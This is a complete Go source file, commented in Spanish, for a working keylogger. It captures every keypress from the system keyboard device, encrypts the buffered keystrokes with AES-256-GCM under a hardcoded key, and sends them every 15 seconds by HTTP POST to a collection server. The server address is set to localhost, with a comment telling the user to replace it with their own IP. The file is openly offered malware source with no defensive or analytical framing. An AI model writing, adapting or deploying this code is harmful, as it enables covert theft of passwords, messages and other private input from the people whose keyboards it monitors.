package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/MarinX/keylogger"
)

var (
	buffer        []string
	encryptionKey = []byte("0123456789abcdef0123456789abcdef") // 32 bytes AES-256
	serverURL     = "http://localhost:8080/recibir"            // Cambia por tu IP
)

// Cifra el contenido con AES-256 GCM
func encryptAES(data string, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// Envía los datos cifrados al servidor
func sendEncryptedData(ciphertext string) {
	resp, err := http.Post(serverURL, "text/plain", bytes.NewBuffer([]byte(ciphertext)))
	if err != nil {
		log.Println("Error al enviar al servidor:", err)
		return
	}
	defer resp.Body.Close()
	log.Println("Datos enviados al servidor. Código:", resp.StatusCode)
}

// Guarda las teclas cada 15s, las cifra y las envía
func saveAndSend() {
	if len(buffer) == 0 {
		return
	}
	text := strings.Join(buffer, "")
	buffer = []string{}

	ciphered, err := encryptAES(text, encryptionKey)
	if err != nil {
		log.Println("Error al cifrar:", err)
		return
	}

	sendEncryptedData(ciphered)
}

func main() {
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) == 0 {
		log.Fatal("No se encontró dispositivo de teclado.")
	}
	fmt.Println("Escuchando en:", keyboard)

	k, err := keylogger.New(keyboard)
	if err != nil {
		log.Fatal("Error al abrir teclado:", err)
	}
	defer k.Close()

	events := k.Read()

	ticker := time.NewTicker(15 * time.Second)
	go func() {
		for range ticker.C {
			saveAndSend()
		}
	}()

	fmt.Println("Keylogger con cifrado iniciado. Ctrl+C para salir.")

	for e := range events {
		if e.Type == keylogger.EvKey && e.KeyPress() {
			key := e.KeyString()
			if len(key) == 1 {
				buffer = append(buffer, key)
			} else {
				buffer = append(buffer, "["+key+"]")
			}
		}
	}
}
